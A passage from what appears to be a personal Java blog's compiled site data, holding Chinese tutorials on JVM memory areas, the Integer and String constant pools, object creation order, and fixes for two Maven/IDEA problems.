register）是一块较小的内存空间，可以看作是当前线程所执行字节码的行号指示器，指向下一个将要执行的指令代码，由执行引擎来读取下一条指令。更确切的说，一个线程的执行，是通过字节码解释器改变当前线程的计数器的值，来获取下一条需要执行的字节码指令，从而确保线程的正确执行。\n\n为了确保线程切换后（上下文切换）能恢复到正确的执行位置，每个线程都有一个独立的程序计数器，各个线程的计数器互不影响，独立存储。也就是说程序计数器是线程私有的内存。\n\n如果线程执行 java 方法，这个计数器记录的是正在执行的虚拟机字节码指令的地址；如果执行的是 native 方法，计数器值为undefined。\n\n程序计数器不会发生内存溢出（outofmemoryerror即oom）问题。\n\n\n# 2. 栈\n\njvm 中的栈包括 java 虚拟机栈和本地方法栈，两者的区别就是，java 虚拟机栈为 jvm 执行 java 方法服务，本地方法栈则为 jvm 使用到的 native 方法服务。两者作用是极其相似的，本文主要介绍 java 虚拟机栈，以下简称栈。\n\n> native 方法是什么？\n\njdk 中有很多方法是使用 native 修饰的。native 方法不是以 java 语言实现的，而是以本地语言实现的（比如 c 或 c++）。个人理解native 方法是与操作系统直接交互的。比如通知垃圾收集器进行垃圾回收的代码 system.gc()，就是使用 native 修饰的。\n\npublic final class system {\n    public static void gc() {\n        runtime.getruntime().gc();\n    }\n}\n \npublic class runtime {\n    //使用native修饰\n     public native void gc();\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n> 什么是栈？\n\n定义：限定仅在表头进行插入和删除操作的线性表。即压栈（入栈）和弹栈（出栈）都是对栈顶元素进行操作的。所以栈是后进先出的。\n\n栈是线程私有的，他的生命周期与线程相同。每个线程都会分配一个栈的空间，即每个线程拥有独立的栈空间。\n\n\n\n> 栈中存储的是什么？\n\n栈帧是栈的元素。每个方法在执行时都会创建一个栈帧。栈帧中存储了局部变量表、操作数栈、动态连接和方法出口等信息。每个方法从调用到运行结束的过程，就对应着一个栈帧在栈中压栈到出栈的过程。\n\n\n\n\n# 2.1 局部变量表\n\n栈帧中，由一个局部变量表存储数据。局部变量表中存储了基本数据类型（boolean、byte、char、short、int、float、long、double）的局部变量（包括参数）、和对象的引用（string、数组、对象等），但是不存储对象的内容。局部变量表所需的内存空间在编译期间完成分配，在方法运行期间不会改变局部变量表的大小。\n\n局部变量的容量以**变量槽（variable slot）**为最小单位，每个变量槽最大存储32位的数据类型。对于64位的数据类型（long、double），jvm 会为其分配两个连续的变量槽来存储。以下简称 slot 。\n\njvm 通过索引定位的方式使用局部变量表，索引的范围从0开始至局部变量表中最大的 slot 数量。普通方法与 static 方法在第 0 个槽位的存储有所不同。非 static 方法的第 0 个槽位存储方法所属对象实例的引用。\n\n\n\n> slot 复用？\n\n为了尽可能的节省栈帧空间，局部变量表中的 slot 是可以复用的。方法中定义的局部变量，其作用域不一定会覆盖整个方法。当方法运行时，如果已经超出了某个变量的作用域，即变量失效了，那这个变量对应的 slot 就可以交给其他变量使用，也就是所谓的 slot 复用。通过一个例子来理解变量“失效”。\n\npublic void test(boolean flag)\n{\n    if(flag)\n    {\n        int a = 66;\n    }\n    \n    int b = 55;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n当虚拟机运行 test 方法，就会创建一个栈帧，并压入到当前线程的栈中。当运行到 int a = 66时，在当前栈帧的局部变量中创建一个 slot 存储变量 a，当运行到 int b = 55时，此时已经超出变量 a 的作用域了（变量 a 的作用域在{}所包含的代码块中），此时 a 就失效了，变量a 占用的 slot 就可以交给b来使用，这就是 slot 复用。\n\n凡事有利弊。slot 复用虽然节省了栈帧空间，但是会伴随一些额外的副作用。比如，slot 的复用会直接影响到系统的垃圾收集行为。\n\npublic class testdemo {\n \n    public static void main(string[] args){\n        \n        byte[] placeholder = new byte[64 * 1024 * 1024];\n        \n        system.gc();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n上段代码很简单，先向内存中填充了 64m 的数据，然后通知虚拟机进行垃圾回收。为了更清晰的查看垃圾回收的过程，我们再虚拟机的运行参数中加上“-verbose:gc”,这个参数的作用就是打印 gc 信息。\n\n\n\n打印的gc信息如下：\n\n\n\n可以看到虚拟机没有回收这 64m 内存。为什么没有被回收？其实很好理解，当执行 system.gc() 方法时，变量 placeholder 还在作用域范围之内，虚拟机是不会回收的，它还是“有效”的。\n\n我们对上面的代码稍作修改，使其作用域“失效”。\n\npublic class testdemo {\n \n    public static void main(string[] args){\n        {\n            byte[] placeholder = new byte[64 * 1024 * 1024];\n        }\n        system.gc();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n当运行到 system.gc() 方法时，变量 placeholder 的作用域已经失效了。它已经“无用”了，虚拟机会回收它所占用的内存了吧？\n\n运行结果：\n\n\n\n发现虚拟机还是没有回收 placeholder 变量占用的 64m 内存。为什么所想非所见呢？在解释之前，我们再对代码稍作修改。在system.gc()方法执行之前，加入一个局部变量。\n\npublic class testdemo {\n \n    public static void main(string[] args){\n        {\n            byte[] placeholder = new byte[64 * 1024 * 1024];\n        }\n        int a = 0;\n        system.gc();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n在 system.gc() 方法之前，加入 int a = 0，再执行方法，查看垃圾回收情况。\n\n\n\n发现 placeholder 变量占用的64m内存空间被回收了，如果不理解局部变量表的slot复用，很难理解这种现象的。\n\n而 placeholder 变量能否被回收的关键就在于：局部变量表中的 slot 是否还存有关于 placeholder 对象的引用。\n\n第一次修改中，限定了 placeholder 的作用域，但之后并没有任何对局部变量表的读写操作，placeholder 变量在局部变量表中占用的slot没有被其它变量所复用，所以作为 gc roots 一部分的局部变量表仍然保持着对它的关联。所以 placeholder 变量没有被回收。\n\n第二次修改后，运行到 int a = 0 时，已经超过了 placeholder 变量的作用域，此时 placeholder 在局部变量表中占用的slot可以交给其他变量使用。而变量a正好复用了 placeholder 占用的 slot，至此局部变量表中的 slot 已经没有 placeholder 的引用了，虚拟机就回收了placeholder 占用的 64m 内存空间。\n\n----------------------------------------\n\n\n# 2.2 操作数栈\n\n操作数栈是一个后进先出栈。操作数栈的元素可以是任意的java数据类型。方法刚开始执行时，操作数栈是空的，在方法执行过程中，通过字节码指令对操作数栈进行压栈和出栈的操作。通常进行算数运算的时候是通过操作数栈来进行的**，又或者是在调用其他方法的时候通过操作数栈进行参数传递****。操作数栈可以理解为栈帧中用于计算的临时数据存储区**。\n\n通过一段代码来了解操作数栈。\n\npublic class operandstack{\n \n    public static int add(int a, int b){\n        int c = a + b;\n        return c;\n    }\n \n    public static void main(string[] args){\n        add(100, 98);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n使用 javap **反编译 **operandstack 后，根据虚拟机指令集，得出操作数栈的运行流程如下：\n\n\n\nadd 方法刚开始执行时，操作数栈是空的。当执行 iload_0 时，把局部变量 0 压栈，即 100 入操作数栈。然后执行 iload_1，把局部变量1压栈，即 98 入操作数栈。接着执行 iadd，弹出两个变量（100 和 98 出操作数栈），对 100 和 98 进行求和，然后将结果 198 压栈。然后执行 istore_2，弹出结果（出栈）。\n\n下面通过一张图，对比执行100+98操作，局部变量表和操作数栈的变化情况。\n\n\n\n> 栈中可能出现哪些异常？\n\nstackoverflowerror：栈溢出错误\n\n如果一个线程在计算时所需要用到栈大小 > 配置允许最大的栈大小，那么java虚拟机将抛出 stackoverflowerror\n\noutofmemoryerror：内存不足\n\n栈进行动态扩展时如果无法申请到足够内存，会抛出 outofmemoryerror 异常。\n\n> 如何设置栈参数？\n\n使用 -xss 设置栈大小，通常几百k就够用了。由于栈是线程私有的，线程数越多，占用栈空间越大。\n\n栈决定了函数调用的深度。这也是慎用递归调用的原因。递归调用时，每次调用方法都会创建栈帧并压栈。当调用一定次数之后，所需栈的大小已经超过了虚拟机运行配置的最大栈参数，就会抛出 stackoverflowerror 异常。\n\n\n# 3. java堆\n\n堆是java虚拟机所管理的内存中最大的一块存储区域。堆内存被所有线程共享。主要存放使用new关键字创建的对象。所有对象实例以及数组都要在堆上分配。垃圾收集器就是根据gc算法，收集堆上对象所占用的内存空间（收集的是对象占用的空间而不是对象本身）。\n\njava堆分为年轻代（young generation）和老年代（old generation）；年轻代又分为伊甸园（eden）和幸存区（survivor区）；幸存区又分为from survivor空间和 to survivor空间。\n\n年轻代存储“新生对象”，我们新创建的对象存储在年轻代中。当年轻内存占满后，会触发minor gc，清理年轻代内存空间。\n\n老年代存储长期存活的对象和大对象。年轻代中存储的对象，经过多次gc后仍然存活的对象会移动到老年代中进行存储。老年代空间占满后，会触发full gc。\n\n注：full gc是清理整个堆空间，包括年轻代和老年代。如果full gc之后，堆中仍然无法存储对象，就会抛出outofmemoryerror异常。\n\n\n\n> java堆设置常用参数\n\n参数                                描述\n-xms                              堆内存初始大小\n-xmx（maxheapsize）                 堆内存最大允许大小，一般不要大于物理内存的80%\n-xx:newsize（-xns）                 年轻代内存初始大小\n-xx:maxnewsize（-xmn）              年轻代内存最大允许大小，也可以缩写\n-xx:newratio                      新生代和老年代的比值\n                                  \n                                  值为4 表示 新生代:老年代=1:4，即年轻代占堆的1/5\n-xx:survivorratio=8               年轻代中eden区与survivor区的容量比例值，默认为8\n                                  \n                                  表示两个survivor :eden=2:8，即一个survivor占年轻代的1/10\n-xx:+heapdumponoutofmemoryerror   内存溢出时，导出堆信息到文件\n-xx:+heapdumppath                 堆dump路径\n                                  \n                                  -xmx20m -xms5m\n                                  \n                                  -xx:+heapdumponoutofmemoryerror\n                                  \n                                  -xx:heapdumppath=d:/a.dump\n-xx:onoutofmemoryerror            当发生oom内存溢出时，执行一个脚本\n                                  \n                                  -xx:onoutofmemoryerror=d:/tools/jdk1.7_40/bin/printstack.bat\n                                  %p\n                                  \n                                  %p表示线程的id pid\n-xx:maxtenuringthreshold=7        表示如果在幸存区移动多少次没有被垃圾回收，进入老年代\n\n\n# 4. 方法区（method area）\n\n方法区同 java 堆一样是被所有线程共享的区间，用于存储已被虚拟机加载的类信息、常量、静态变量、即时编译器编译后的代码。更具体的说，静态变量+常量+类信息（版本、方法、字段等）+运行时常量池存在方法区中。常量池是方法区的一部分。\n\n\n\n注：jdk1.8 使用元空间 **metaspace **替代方法区，元空间并不在 jvm中，而是使用本地内存。元空间两个参数：\n\n 1. metaspacesize：初始化元空间大小，控制发生gc阈值\n 2. maxmetaspacesize ： 限制元空间大小上限，防止异常占用过多物理内存\n\n常量池中存储编译器生成的各种字面量和符号引用。字面量就是java中常量的意思。比如文本字符串，final修饰的常量等。方法引用则包括类和接口的全限定名，方法名和描述符，字段名和描述符等。\n\n\n\n> 常量池有什么用 ？\n\n**优点：**常量池避免了频繁的创建和销毁对象而影响系统性能，其实现了对象的共享。\n\n举个栗子： integer 常量池（缓存池），和字符串常量池\n\n> integer常量池：\n\n我们知道 == 基本数据类型比较的是数值，而引用数据类型比较的是内存地址。\n\npublic void testintegercache()\n{\n    public static void main(string[] args)\n    {\n        \n        integer i1 = new integer(66);\n        integer i2 = new integer(66);\n        integer i3 = 66;\n        integer i4 = 66;\n        integer i5 = 150;\n        integer i6 = 150;\n        system.out.println(i1 == i2);//false\n        system.out.println(i3 == i4);//true\n        system.out.println(i5 == i6);//false\n    }\n    \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\ni1 和 i2 使用 new 关键字，每 new 一次都会在堆上创建一个对象，所以 i1 == i2 为 false。\n\ni3 == i4 为什么是 true 呢？integer i3 = 66 实际上有一步装箱的操作，即将 int 型的 66 装箱成 integer，通过 integer 的 valueof 方法。\n\npublic static integer valueof(int i) {\n    if (i >= integercache.low && i <= integercache.high){\n    \treturn integercache.cache[i + (-integercache.low)];\n    }\n    return new integer(i);\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\ninteger 的 valueof 方法很简单，它判断变量是否在 **integercache **的最小值（-128）和最大值（127）之间，如果在，则返回常量池中的内容，否则 new 一个 integer 对象。\n\n而 **integercache **是 integer的静态内部类，作用就是将 [-128,127] 之间的数“缓存”在 integercache 类的 cache 数组中，valueof 方法就是调用常量池的 cache 数组，不过是将 i3、i4 变量引用指向常量池中，没有真正的创建对象。而new integer(i)则是直接在堆中创建对象。\n\nintegercache 类中，包含一个构造方法，三个静态变量：low最小值、high最大值、和integer数组，还有一个静态代码块。静态代码块的作用就是在 integercache 类加载的时候，对high最大值以及 integer 数组初始化。也就是说当 integercache 类加载的时候，最大最小值，和 integer 数组就已经初始化好了。这个 integer 数组其实就是包含了 -128到127之间的所有值。\n\n> integercache 源码\n\nprivate static class integercache {\n        static final int low = -128;//最小值\n        static final int high;//最大值\n        static final integer cache[];//缓存数组\n \n        //私有化构造方法，不让别人创建它。单例模式的思想\n        private integercache() {}\n \n        //类加载的时候，执行静态代码块。作用是将-128到127之间的数缓冲在cache[]数组中\n        static {\n            // high value may be configured by property\n            int h = 127;\n            string integercachehighpropvalue =\n                sun.misc.vm.getsavedproperty("java.lang.integer.integercache.high");\n            if (integercachehighpropvalue != null) {\n                try {\n                    int i = parseint(integercachehighpropvalue);\n                    i = math.max(i, 127);\n                    // maximum array size is integer.max_value\n                    h = math.min(i, integer.max_value - (-low) -1);\n                } catch( numberformatexception nfe) {\n                    // if the property cannot be parsed into an int, ignore it.\n                }\n            }\n            high = h;\n \n            cache = new integer[(high - low) + 1];//初始化cache数组，根据最大最小值确定\n            int j = low;\n            for(int k = 0; k < cache.length; k++)//遍历将数据放入cache数组中\n                cache[k] = new integer(j++);\n \n            // range [-128, 127] must be interned (jls7 5.1.7)\n            assert integercache.high >= 127;\n        }\n \n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n\n\n而 i5 == i6 为 false，就是因为 **150 不在 integer 常量池的最大最小值之间【-128,127】，从而 new 了一个对象，**所以为 false。\n\n再看一段拆箱的代码。\n\npublic static void main(string[] args){\n       integer i1 = new integer(4);\n       integer i2 = new integer(6);\n       integer i3 = new integer(10);\n       system.out.print(i3 == i1+i2);//true\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n由于 i1 和 i2 是 integer 对象，是不能使用+运算符的。首先 i1 和 i2 进行自动拆箱操作，拆箱成int后再进行数值加法运算。i3 也是拆箱后再与之比较数值是否相等的。所以 i3 == i1+i2 其实是比较的 int 型数值是否相等，所以为true。\n\n----------------------------------------\n\n> string常量池：\n\nstring 是由 final 修饰的类，是不可以被继承的。通常有两种方式来创建对象。\n\nstring str = new string("abcd");\nstring str = "abcd";\n\n\n1\n2\n\n\n第一种使用 new 创建的对象，存放在堆中。每次调用都会创建一个新的对象。\n\n第二种先在栈上创建一个 string 类的对象引用变量 str，然后通过符号引用去字符串常量池中找有没有 “abcd”，如果没有，则将“abcd”存放到字符串常量池中，并将栈上的 str 变量引用指向常量池中的“abcd”。如果常量池中已经有“abcd”了，则不会再常量池中创建“abcd”，而是直接将 str 引用指向常量池中的“abcd”。\n\n对于 string 类，equals 方法用于比较字符串内容是否相同； == 号用于比较内存地址是否相同，即是否指向同一个对象。通过代码验证上面理论。\n\npublic static void main(string[] args){\n    string str1 = "abcd";\n    string str2 = "abcd";\n\tsystem.out.print(str1 == str2);\n}\n    \n\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n首先在栈上存放变量引用 str1，然后通过符号引用去常量池中找是否有 abcd，没有，则将 abcd 存储在常量池中，然后将 str1 指向常量池的 abcd。当创建 str2 对象，去常量池中发现已经有 abcd 了，就将 str2 引用直接指向 abcd 。所以str1 == str2，指向同一个内存地址。\n\npublic static void main(string[] args){\n    string str1 = new string("abcd");\n    string str2 = new string("abcd");\n    system.out.print(str1 == str2);\n}\n\n\n1\n2\n3\n4\n5\n\n\nstr1 和 str2 使用 new 创建对象，分别在堆上创建了不同的对象。两个引用指向堆中两个不同的对象，所以为 false。\n\n> 关于字符串 + 号连接问题：\n\n对于字符串常量的 + 号连接，在程序编译期，jvm就会将其优化为 + 号连接后的值。所以在编译期其字符串常量的值就确定了。\n\nstring a = "a1";   \nstring b = "a" + 1;   \nsystem.out.println((a == b)); //result = true  \n \nstring a = "atrue";   \nstring b = "a" + "true";   \nsystem.out.println((a == b)); //result = true \n \nstring a = "a3.4";   \nstring b = "a" + 3.4;   \nsystem.out.println((a == b)); //result = true \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n> 关于字符串引用 + 号连接问题：\n\n对于字符串引用的 + 号连接问题，由于字符串引用在编译期是无法确定下来的，在程序的运行期动态分配并创建新的地址存储对象。\n\npublic static void main(string[] args){\n       string str1 = "a";\n\t   string str2 = "ab";\n\t   string str3 = str1 + "b";\n\t   system.out.print(str2 == str3);//false\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n对于上边代码，str3 等于 str1 引用 + 字符串常量“b”，在编译期无法确定，在运行期动态的分配并将连接后的新地址赋给 str3，所以 str2 和 str3 引用的内存地址不同，所以 str2 == str3 结果为 false\n\n通过 jad 反编译工具，分析上述代码到底做了什么。编译指令如下：\n\n\n\n经过 jad 反编译工具反编译代码后，代码如下\n\npublic class testdemo\n{\n \n    public testdemo()\n    {\n    }\n \n    public static void main(string args[])\n    {\n        string s = "a";\n        string s1 = "ab";\n        string s2 = (new stringbuilder()).append(s).append("b").tostring();\n        system.out.print(s1 = s2);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n发现 new 了一个 stringbuilder 对象，然后使用 append 方法优化了 + 操作符。new 在堆上创建对象，而 string s1=“ab”则是在常量池中创建对象，两个应用所指向的内存地址是不同的，所以 s1 == s2 结果为 false。\n\n注：我们已经知道了字符串引用的 + 号连接问题，其实是在运行期间创建一个 stringbuilder 对象，使用其 append 方法将字符串连接起来。这个也是我们开发中需要注意的一个问题，就是尽量不要在 for 循环中使用 + 号来操作字符串。看下面一段代码：\n\npublic static void main(string[] args){\n        string s = null;\n        for(int i = 0; i < 100; i++){\n            s = s + "a";\n        }\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n在 for 循环中使用 + 连接字符串，每循环一次，就会新建 stringbuilder 对象，append 后就“抛弃”了它。如果我们在循环外创建stringbuilder 对象，然后在循环中使用 append 方法追加字符串，就可以节省 n-1 次创建和销毁对象的时间。所以在循环中连接字符串，一般使用 stringbuilder 或者 stringbuffer，而不是使用 + 号操作。\n\npublic static void main(string[] args){\n        stringbuilder s = new stringbuilder();\n        for(int i = 0; i < 100; i++){\n            s.append("a");\n        }\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n> 使用final修饰的字符串\n\npublic static void main(string[] args){\n        final string str1 = "a";\n        string str2 = "ab";\n        string str3 = str1 + "b";\n        system.out.print(str2 == str3);//true\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\nfinal 修饰的变量是一个常量，编译期就能确定其值。所以 str1 + "b"就等同于 "a" + "b"，所以结果是 true。\n\n> string对象的intern方法。\n\npublic static void main(string[] args){\n        string s = "ab";\n        string s1 = "a";\n        string s2 = "b";\n        string s3 = s1 + s2;\n        system.out.println(s3 == s);//false\n        system.out.println(s3.intern() == s);//true\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n通过前面学习我们知道，s1+s2 实际上在堆上 new 了一个 stringbuilder 对象，而 s 在常量池中创建对象 “ab”，所以 s3 == s 为 false。但是 s3 调用 intern 方法，返回的是s3的内容（ab）在常量池中的地址值。所以 s3.intern() == s 结果为 true。',charsets:{cjk:!0},lastUpdated:"2022/04/18, 00:47:23",lastUpdatedTimestamp:1650214043e3},{title:"java 创建对象过程 实例化和初始化",frontmatter:{title:"java 创建对象过程 实例化和初始化",date:"2022-08-10T15:50:10.000Z",permalink:"/pages/126d5d/",categories:["java","jvm"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/04.java/05.jvm/13.java%20%E5%88%9B%E5%BB%BA%E5%AF%B9%E8%B1%A1%E8%BF%87%E7%A8%8B%20%E5%AE%9E%E4%BE%8B%E5%8C%96%E5%92%8C%E5%88%9D%E5%A7%8B%E5%8C%96.html",relativePath:"04.java/05.jvm/13.java 创建对象过程 实例化和初始化.md",key:"v-76ded2f6",path:"/pages/126d5d/",headers:[{level:3,title:"引用赋值",slug:"引用赋值",normalizedTitle:"引用赋值",charIndex:623},{level:2,title:"init() 与 clinit() 加载顺序",slug:"init-与-clinit-加载顺序",normalizedTitle:"init() 与 clinit() 加载顺序",charIndex:993}],headersStr:"引用赋值 init() 与 clinit() 加载顺序",content:'> 本文原文地址 blog.csdn.net\n\n我们先看看类的加载过程，在我们运行 java 代码时，首先会通过编译器将. java 的文件编程成. class 文件，之后在通过类加载器将. class 文件转为字节码加载到 jvm 运行时数据区里面，整个加载过程如下\n\n\n\n上图只是类的加载过程，还没有创建对象； 那如果创建对象的话，比如执行 new Object(); 这段代码，里面主要有 2 个步骤，分别是实例化和初始化\n\n\n\n如果创建对象的是有引用变量，那就是这样的\n\n\n\n\n# 实例化 (半初始化)\n\n对象实例化的过程，其实也叫半初始化，就是时候你创建对象的过程中创建到一半的情况下，拿下面的代码来举例：\n\npackage com.test;\npublic class Test {\n \n    public static void main(String[] args) throws InterruptedException {\n \n        Obj object_1 = new Obj();\n    }\n}\n \nclass Obj {\n    int i = 13;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n首先会为该对象分配一块堆内存用来存放对象和父类的属性实例，new 这个关键字就是用来分配内存的，并且给对象和父类的属性进行复制，这里的赋值都是给默认值，也就是零值；\n\n\n\n\n# 初始化和引用赋值\n\n初始化就需要给属性赋值真正的数据了，这个数据是用户给定的，如果是引用的话，就会将引用变量指向给定的地址，并且调用初始化方法\n\ninit() 方法：就是我们说的构造器，构造器就包括 构造方法、{} 包住的代码等。\n\nclinit() 方法： () 方法是由编译器自动收集类中的所有类变量的赋值动作和静态语句块（static{} 语句）中的语句合并产生的，编译器收集的顺序是有语句在源文件中出现的顺序所决定的，静态语句块中只能访问到定义在静态语句块之前的变量，定义在它之后的变量，在前面的静态语句块中可以赋值，但不能访问。\n\n\n# 引用赋值\n\n引用赋值是先分配一块栈内存来存放 object_1 并将栈内存的 object_1 指向堆内存的对象实例，这也是对象创建的最后一步操作；引用赋值完成后，整个对像就创建完成了！\n\n\n\n\n# init() 与 clinit() 加载顺序\n\n当一个类初始化的时候，先调用 方法 ，然后在继续执行 < init>\n\n我们用用代码测试下\n\npackage com.test;\n \n/**\n * 类初始化\n */\npublic class Init {\n \n    public static void main(String[] args) {\n        ChildClass childClass = new ChildClass();\n    }\n}\n \n \nclass  ChildClass extends ParentClass{\n \n    static {\n        System.out.println("我是子类的静态方法");\n    }\n \n    public ChildClass(){\n        System.out.println("我是子类的构造函数");\n    }\n}\n \nclass ParentClass{\n    static {\n        System.out.println("我是父类的静态方法");\n    }\n \n    public ParentClass(){\n        System.out.println("我是父类的构造函数");\n    }\n \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n打印结果\n\n我是父类的静态方法\n我是子类的静态方法\n我是父类的构造函数\n我是子类的构造函数\n\n\n1\n2\n3\n4\n',normalizedContent:'> 本文原文地址 blog.csdn.net\n\n我们先看看类的加载过程，在我们运行 java 代码时，首先会通过编译器将. java 的文件编程成. class 文件，之后在通过类加载器将. class 文件转为字节码加载到 jvm 运行时数据区里面，整个加载过程如下\n\n\n\n上图只是类的加载过程，还没有创建对象； 那如果创建对象的话，比如执行 new object(); 这段代码，里面主要有 2 个步骤，分别是实例化和初始化\n\n\n\n如果创建对象的是有引用变量，那就是这样的\n\n\n\n\n# 实例化 (半初始化)\n\n对象实例化的过程，其实也叫半初始化，就是时候你创建对象的过程中创建到一半的情况下，拿下面的代码来举例：\n\npackage com.test;\npublic class test {\n \n    public static void main(string[] args) throws interruptedexception {\n \n        obj object_1 = new obj();\n    }\n}\n \nclass obj {\n    int i = 13;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n首先会为该对象分配一块堆内存用来存放对象和父类的属性实例，new 这个关键字就是用来分配内存的，并且给对象和父类的属性进行复制，这里的赋值都是给默认值，也就是零值；\n\n\n\n\n# 初始化和引用赋值\n\n初始化就需要给属性赋值真正的数据了，这个数据是用户给定的，如果是引用的话，就会将引用变量指向给定的地址，并且调用初始化方法\n\ninit() 方法：就是我们说的构造器，构造器就包括 构造方法、{} 包住的代码等。\n\nclinit() 方法： () 方法是由编译器自动收集类中的所有类变量的赋值动作和静态语句块（static{} 语句）中的语句合并产生的，编译器收集的顺序是有语句在源文件中出现的顺序所决定的，静态语句块中只能访问到定义在静态语句块之前的变量，定义在它之后的变量，在前面的静态语句块中可以赋值，但不能访问。\n\n\n# 引用赋值\n\n引用赋值是先分配一块栈内存来存放 object_1 并将栈内存的 object_1 指向堆内存的对象实例，这也是对象创建的最后一步操作；引用赋值完成后，整个对像就创建完成了！\n\n\n\n\n# init() 与 clinit() 加载顺序\n\n当一个类初始化的时候，先调用 方法 ，然后在继续执行 < init>\n\n我们用用代码测试下\n\npackage com.test;\n \n/**\n * 类初始化\n */\npublic class init {\n \n    public static void main(string[] args) {\n        childclass childclass = new childclass();\n    }\n}\n \n \nclass  childclass extends parentclass{\n \n    static {\n        system.out.println("我是子类的静态方法");\n    }\n \n    public childclass(){\n        system.out.println("我是子类的构造函数");\n    }\n}\n \nclass parentclass{\n    static {\n        system.out.println("我是父类的静态方法");\n    }\n \n    public parentclass(){\n        system.out.println("我是父类的构造函数");\n    }\n \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n打印结果\n\n我是父类的静态方法\n我是子类的静态方法\n我是父类的构造函数\n我是子类的构造函数\n\n\n1\n2\n3\n4\n',charsets:{cjk:!0},lastUpdated:"2022/05/15, 12:03:14",lastUpdatedTimestamp:1652587394e3},{title:"Maven创建module弹出被忽略(Ignored)的Ignored—pom.xml文件解决办法",frontmatter:{title:"Maven创建module弹出被忽略(Ignored)的Ignored—pom.xml文件解决办法",date:"2022-04-17T22:22:39.000Z",permalink:"/pages/05cd74/",categories:["java"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/04.java/10.%20%E8%A7%A3%E5%86%B3%E9%97%AE%E9%A2%98/01.%E5%85%B3%E4%BA%8EMaven%E5%88%9B%E5%BB%BAmodule%E5%BC%B9%E5%87%BA%E8%A2%AB%E5%BF%BD%E7%95%A5(Ignored)%E7%9A%84%20Ignoredpom.xml%E6%96%87%E4%BB%B6%E5%A6%82.html",relativePath:"04.java/10. 解决问题/01.关于Maven创建module弹出被忽略(Ignored)的 Ignoredpom.xml文件如.md",key:"v-6e965536",path:"/pages/05cd74/",headers:[{level:2,title:"问题描述：",slug:"问题描述",normalizedTitle:"问题描述：",charIndex:2},{level:2,title:"问题分析：",slug:"问题分析",normalizedTitle:"问题分析：",charIndex:121},{level:2,title:"解决方案：",slug:"解决方案",normalizedTitle:"解决方案：",charIndex:230}],headersStr:"问题描述： 问题分析： 解决方案：",content:"# 问题描述：\n\n创建module时，因为初次接触，没有正确建好module所以把它删掉了！又创建了一个之前删除了的同名的module名称。但是，却弹出被忽略(Ignored)的==Ignored pom.xml文件==，如图：\n\n\n\n\n# 问题分析：\n\n * 由于相同名称的module在之前被创建过，因此在IDEA中留有痕迹。重新创建一个新的同名module会让IDEA误以为是之前被删除掉的module，所以才自动将这个pom.xml文件忽略了\n\n\n# 解决方案：\n\n 1. 点击file > Setting进入设置\n\n 2. 找到lgnored file，把右边已选中的选项==取消勾选==，然后点击 ok\n\n 3. 再点击右上角Maven中的刷新一下，这样pom.xml 文件就被变回来了",normalizedContent:"# 问题描述：\n\n创建module时，因为初次接触，没有正确建好module所以把它删掉了！又创建了一个之前删除了的同名的module名称。但是，却弹出被忽略(ignored)的==ignored pom.xml文件==，如图：\n\n\n\n\n# 问题分析：\n\n * 由于相同名称的module在之前被创建过，因此在idea中留有痕迹。重新创建一个新的同名module会让idea误以为是之前被删除掉的module，所以才自动将这个pom.xml文件忽略了\n\n\n# 解决方案：\n\n 1. 点击file > setting进入设置\n\n 2. 找到lgnored file，把右边已选中的选项==取消勾选==，然后点击 ok\n\n 3. 再点击右上角maven中的刷新一下，这样pom.xml 文件就被变回来了",charsets:{cjk:!0},lastUpdated:"2022/04/18, 00:47:23",lastUpdatedTimestamp:1650214043e3},{title:"maven_mvn install报错：No compiler is provided in thi",frontmatter:{title:"maven_mvn install报错：No compiler is provided in thi",date:"2022-04-17T22:22:39.000Z",permalink:"/pages/44afd3/",categories:["java"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/04.java/10.%20%E8%A7%A3%E5%86%B3%E9%97%AE%E9%A2%98/02.maven_mvn%20install%E6%8A%A5%E9%94%99%EF%BC%9ANo%20compiler%20is%20provided%20in%20thi.html",relativePath:"04.java/10. 解决问题/02.maven_mvn install报错：No compiler is provided in thi.md",key:"v-5e2a8332",path:"/pages/44afd3/",headersStr:null,content:"这个是因为windows安装jdk的时候环境变量默认配到了jre上面了 重新配置下环境变量就可以解决问题 输入 mvn -v 则可以看到maven调用的java环境的位置 可以发现默认是jre，所以需要重新配置环境变量 